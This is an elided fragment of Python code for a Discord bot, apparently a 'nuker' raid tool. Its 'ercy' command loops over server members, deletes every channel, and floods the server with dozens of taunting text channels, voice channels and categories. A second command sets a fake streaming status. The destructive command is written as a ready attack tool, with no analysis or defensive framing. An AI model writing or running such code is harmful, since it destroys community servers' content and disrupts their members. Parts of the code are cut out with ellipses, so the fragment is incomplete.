...
async def ercy(ctx):
    ...
    for users in ctx.guild.members:
        try:
            ...
            print(f"{Fore.RED}ERCY HOED YOU ")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.RED}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'ERCY HOED YOU {i}')
            await ctx.guild.create_voice_channel(name=f'UNHOEABLE {i}')
            await ctx.guild.create_category(name=f'ERCY was here {i}')
...
async def stream(ctx, *, message): 
    ...
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/danger", 
    )
    await Danger.change_presence(activity=stream)
